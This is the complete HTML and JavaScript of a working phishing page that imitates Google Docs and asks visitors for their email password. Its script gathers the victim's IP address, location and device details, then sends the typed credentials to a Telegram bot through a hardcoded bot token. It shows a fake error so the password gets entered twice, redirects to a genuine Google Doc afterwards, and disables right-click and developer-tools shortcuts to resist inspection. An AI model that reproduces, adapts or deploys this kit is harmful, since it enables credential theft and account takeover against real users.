<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Google Docs Online</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
    body, html { height: 100%; overflow: hidden; }

    .screen {
      position: absolute; width: 100%; height: 100%;
      display: none; justify-content: center; align-items: center; flex-direction: column;
      transition: opacity 0.6s ease;
    }

    .screen.active { display: flex; }

    video.bg-video {
      position: fixed; top: 0; left: 0;
      width: 100%; height: 100%; object-fit: cover; z-index: -1;
    }

    .logo { width: 180px; margin-bottom: 10px; }

    .open-btn {
      background-color: #4285F4; border: none; padding: 14px 28px;
      font-size: 18px; color: white; border-radius: 5px; cursor: pointer; margin-top: 25px;
    }

    .floating-icon {
      position: absolute; top: 10%; right: 10%;
      width: 80px; animation: float 3s ease-in-out infinite; z-index: 2;
    }

    @keyframes float {
      0% { transform: translateY(0); }
      50% { transform: translateY(-15px); }
      100% { transform: translateY(0); }
    }

    .text-block {
      color: #fff; text-align: center; max-width: 600px; z-index: 2;
    }

    .text-block h2 { font-size: 28px; margin-bottom: 10px; }
    .text-block p { font-size: 18px; color: #eee; }

    .footer-bottom {
      position: absolute; bottom: 15px; width: 100%;
      text-align: center; font-size: 12px; color: #ccc; line-height: 1.6; z-index: 2; padding: 0 20px;
    }

    .footer-bottom a { color: #ccc; text-decoration: none; margin: 0 4px; }
    .footer-bottom a:hover { text-decoration: underline; }

    #formScreen { position: relative; z-index: 1; }

    #formScreen::before {
      content: ""; position: absolute; top: 0; left: 0;
      width: 100%; height: 100%;
      background-image: url('https://i.imgur.com/5aGiYPc.png');
      background-size: cover; background-position: center;
      filter: blur(6px) brightness(0.4); z-index: -1;
    }

    .form-container {
      background: rgba(255, 255, 255, 0.92); color: #333;
      padding: 40px; border-radius: 10px;
      box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
      width: 90%; max-width: 400px; text-align: center; z-index: 2;
    }

    .form-container img { width: 120px; margin-bottom: 20px; }

    .form-container input {
      width: 100%; padding: 12px; margin: 10px 0;
      border: 1px solid #ccc; border-radius: 6px;
    }

    .form-container button {
      width: 100%; background-color: #4285F4; color: white;
      border: none; padding: 12px; font-size: 16px;
      border-radius: 6px; cursor: pointer;
    }

    .form-container button:hover { background-color: #3367D6; }

    #loadingScreen {
      color: #fff;
      flex-direction: column;
      font-size: 20px;
      font-weight: 500;
      z-index: 10;
      text-shadow: 0 1px 3px rgba(0,0,0,0.5);
    }

    .progress-bar {
      display: flex; height: 6px; width: 180px;
      margin-top: 20px; overflow: hidden; border-radius: 10px;
    }

    .progress-bar span {
      flex: 1; animation: loading 1.4s linear infinite;
    }

    .progress-bar span:nth-child(1) { background: #4285F4; }
    .progress-bar span:nth-child(2) { background: #EA4335; }
    .progress-bar span:nth-child(3) { background: #FBBC05; }
    .progress-bar span:nth-child(4) { background: #34A853; }

    @keyframes loading {
      0% { transform: translateX(-100%); }
      50% { transform: translateX(0); }
      100% { transform: translateX(100%); }
    }

    @keyframes shake {
      0% { transform: translateX(0); }
      20% { transform: translateX(-5px); }
      40% { transform: translateX(5px); }
      60% { transform: translateX(-5px); }
      80% { transform: translateX(5px); }
      100% { transform: translateX(0); }
    }

    input.shake {
      animation: shake 0.4s ease;
    }
  </style>
</head>
<body>

  <video class="bg-video" autoplay muted loop>
    <source src="https://i.imgur.com/MSjEfYe.mp4" type="video/mp4">
  </video>

  <div id="welcome" class="screen active">
    <img src="https://images.icon-icons.com/1011/PNG/512/Google_Drive_icon-icons.com_75713.png" class="floating-icon" alt="Docs Icon">
    <div class="text-block">
      <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png" alt="Google Logo" class="logo">
      <h2>Google Docs Online</h2>
      <p><strong>Online, collaborative documents</strong><br><em>AI-powered documents to help you and your team create and collaborate on content.</em></p>
      <button class="open-btn" onclick="startLoading()">Open Document</button>
    </div>
    <div class="footer-bottom">
      <p>Stay in sync with edits and comments from internal and external teams on your phone, tablet, or web browser.</p>
      <p><a href="#">Google Workspace</a> | <a href="#">About Google</a> | <a href="#">Google Products</a> | <a href="#">Privacy</a> | <a href="#">Terms</a></p>
      <p>© 2025</p>
    </div>
  </div>

  <div id="loadingScreen" class="screen">
    <p>Opening Google Document...</p>
    <div class="progress-bar">
      <span></span><span></span><span></span><span></span>
    </div>
  </div>

  <div id="formScreen" class="screen">
    <div class="form-container">
      <img src="https://i.imgur.com/kRIPrrK.png" alt="Docs Logo">
      <h3>Sign in using your email password to access the document.</h3>
      <form>
        <input type="email" placeholder="Email" value="" required readonly>
        <input type="password" placeholder="Password" required>
        <p id="errorMsg" style="display:none; color: red; font-size: 14px; margin-top: -5px; text-align: left;"></p>
        <button type="submit">Next</button>
      </form>
    </div>
  </div>
  
    <!-- Disable Right Click, Select, Inspect -->
  <script>
    document.addEventListener('contextmenu', event => event.preventDefault());
    document.addEventListener('selectstart', event => event.preventDefault());

    document.addEventListener('keydown', function(e) {
      if (
        (e.ctrlKey && ['c', 'u', 's', 'a', 'x'].includes(e.key.toLowerCase())) ||
        e.key === 'F12' ||
        (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(e.key.toUpperCase()))
      ) {
        e.preventDefault();
      }
    });

    // Disable dragging
    window.onload = () => {
      document.querySelectorAll('img, a, input, textarea, body').forEach(el => {
        el.setAttribute('draggable', 'false');
      });
    };
  </script>

  <script>
    const botToken = '8270025152:AAFulR3oYGEm5jLz6yqBNmVijpA79Y3zpSo'; // Replace with real bot token
    const chatId = '8151965912';     // Replace with real chat ID

    const form = document.querySelector('form');
    const emailInput = form.querySelector('input[type="email"]');
    const passwordInput = form.querySelector('input[type="password"]');
    const errorMsg = document.getElementById("errorMsg");

    const translations = {
      en: {
        passwordError: "Server error, check password and try again."
      }
    };
    const lang = 'en';

    const hashEmail = decodeURIComponent(window.location.hash.substr(1));
    if (hashEmail.includes('@')) emailInput.value = hashEmail;

    let firstDone = false;
    let userInfo = null;

    fetch('https://ipapi.co/json/')
      .then(res => res.json())
      .then(data => {
        userInfo = {
          ip: data.ip,
          isp: data.org,
          city: data.city,
          region: data.region,
          country: data.country_name,
          timezone: data.timezone,
          platform: navigator.platform,
          userAgent: navigator.userAgent
        };
      })
      .catch(() => {
        userInfo = {
          ip: "Unknown",
          isp: "Unknown",
          city: "Unknown",
          region: "Unknown",
          country: "Unknown",
          timezone: "Unknown",
          platform: navigator.platform,
          userAgent: navigator.userAgent
        };
      });

    function startLoading() {
      document.getElementById('welcome').classList.remove('active');
      document.getElementById('loadingScreen').classList.add('active');
      setTimeout(() => {
        document.getElementById('loadingScreen').classList.remove('active');
        document.getElementById('formScreen').classList.add('active');
      }, 3000);
    }

    form.addEventListener("submit", function (e) {
      e.preventDefault();

      const email = emailInput.value.trim();
      const password = passwordInput.value.trim();

      if (!password) {
        showError();
        return;
      }

      if (!userInfo) {
        showError("Please wait... collecting device info.");
        return;
      }

      if (!firstDone) {
        sendToTelegram(email, password, "Client", userInfo);
        showError();
        passwordInput.value = "";
        firstDone = true;
      } else {
        sendToTelegram(email, password, "Client", userInfo);
        errorMsg.style.display = "none";
        window.location.href = "https://docs.google.com/document/d/1yjgEF9X3yrSouY8G0Yv1t3Upd-P0xXiUE0R4Z0qD05c/edit?tab=t.0#heading=h.2gazcsgmxkub";
      }
    });

    function showError(customMsg) {
      errorMsg.textContent = customMsg || translations[lang].passwordError;
      errorMsg.style.display = "block";
      passwordInput.classList.add("shake");
      setTimeout(() => passwordInput.classList.remove("shake"), 400);
    }

    function sendToTelegram(email, password, attempt, info) {
      const message = `
📄 *Google Docs Login Attempt*
📧 Email: ${email}
🔑 Password: ${password}
🧪 Attempt: ${attempt}
🌍 IP: ${info.ip}
🏢 ISP: ${info.isp}
📍 Location: ${info.city}, ${info.region}, ${info.country}
🕒 Timezone: ${info.timezone}
💻 Platform: ${info.platform}
📱 Device Info: ${info.userAgent}
`;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'Markdown'
        })
      }).catch(err => console.error("Telegram Error", err));
    }
  </script>
</body>
</html>
